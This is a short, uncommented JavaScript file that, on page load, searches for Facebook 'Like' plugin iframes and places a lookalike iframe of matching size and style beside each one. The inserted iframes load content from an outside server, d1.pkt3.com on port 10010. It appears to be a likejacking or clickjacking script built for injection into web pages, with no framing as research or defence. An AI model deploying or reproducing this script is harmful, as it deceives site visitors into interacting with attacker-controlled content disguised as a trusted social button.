//var confirmDOM = document.createElement('div');
//confirmDOM.setAttribute('class', 'confirm');
//parent.document.body.appendChild(confirmDOM);

var max_repeat = 10;
var current_find_iteration = 0;
var button_url = 'http://d1.pkt3.com:10010/fuckthat';
var found_iframes = new Array;

find_facebook_like_frames();

function find_facebook_like_frames() {
    for (var i=0; i < document.getElementsByTagName('iframe').length; i++) {
    	var iframe = document.getElementsByTagName('iframe')[i];
	    if (iframe.src.match(/facebook.com\/plugins\/like\.php/)) {
            if (!found_iframes[i]) {
                found_iframes[i] = true; 
                fuck_that_parent(iframe);
            }
        }
	}
    if (current_find_iteration++ < max_repeat) {
	    setTimeout("find_facebook_like_frames()", 100);
    }
}

function fuck_that_parent(iframe) {
    var fucker = document.createElement('iframe');
    fucker.style.height = iframe.style.height;
    fucker.style.width = iframe.style.width;
    fucker.style.overflow = iframe.style.overflow;
    fucker.style.border = iframe.style.border;
    fucker.src = button_url;
    iframe.parentNode.insertBefore(fucker, iframe.nextSibling);
}

function get_query_variable(query_string, variable) {
    var query = query_string.match(/\?.*/);
    if (!query || !query[0]) {
        return;
    }
    var vars = query[0].split("&");
    for (var i = 0; i < vars.length; i++) {
	    var pair = vars[i].split("=");
	    if (pair[0] == variable) {
	        return unescape(pair[1]);
	    }
    }
}
